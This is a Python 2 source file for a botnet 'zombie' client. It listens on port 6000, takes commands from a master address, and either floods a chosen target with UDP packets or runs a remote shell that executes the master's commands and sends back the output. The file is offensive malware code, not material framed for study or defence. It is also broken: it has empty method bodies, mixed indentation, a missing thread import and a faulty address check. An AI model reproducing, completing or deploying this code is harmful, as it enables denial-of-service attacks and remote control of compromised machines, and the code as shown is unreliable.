import sys
import socket
import subprocess


class Zombie:

	def __init__(self):



	#Denial of Service Attack
	def dos(self,dest_ip,dest_port):

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
			print "dos connected..."
		except socket.error, msg :
			print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
			return

		print "starting dos..."
		for i in xrange(10):
			sock.sendto("SPAM",(dest_ip,dest_port))						#Send packets

		print "dos finished..."
		sock.close()													#Close socket

	#Reverse Shell
	def reverse_shell(self,conn):

		conn.sendall("Starting reverse shell...\n")

		while True:
			cmd = conn.recv(1024)				#Receive shell command
			if cmd == 'exit':					#Break if user wished to exit
				conn.sendall("Exiting...\n")
				break

			# do shell command
            new_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # read output
            stdout_value = new_process.stdout.read() + new_process.stderr.read()
            # send back output
            conn.sendall(stdout_value)


	def parse_cmd(self,conn):
		packet = conn.recv(1024)
		packet = packet.split('\r\n')

		#packet = "DDOS\r\nDEST_IP\r\nDEST_PORT\r\n"
		if packet[0] == "DDOS":
			self.dos(packet[1],packet[2])

		elif packet[0] == "SPAM":


		elif packet[0] == "RVSH":
			conn.sendall("RVSH\n")				#Tell master to start sending commands
			self.reverse_shell(conn)


		conn.close()









if __name__ == '__main__':

	MASTER_IP = "127.0.0.1"

	zomb = Zombie()

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#Create socket
		# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
		s.bind(("",6000))											#Bind to port
		s.listen(5)													#Listen 
		print 'Socket created'
	except socket.error, msg :
	    print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
	    sys.exit()

	
	while True:
		# data, addr = s.recvfrom(1024)
		# print "reveived: " + data + " from: " + addr
		conn, addr = s.accept()
		if addr == MASTER_IP:
			#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
    		start_new_thread(zomb.parse_cmd ,(conn,))
    	else:
    		conn.close()



    s.close()
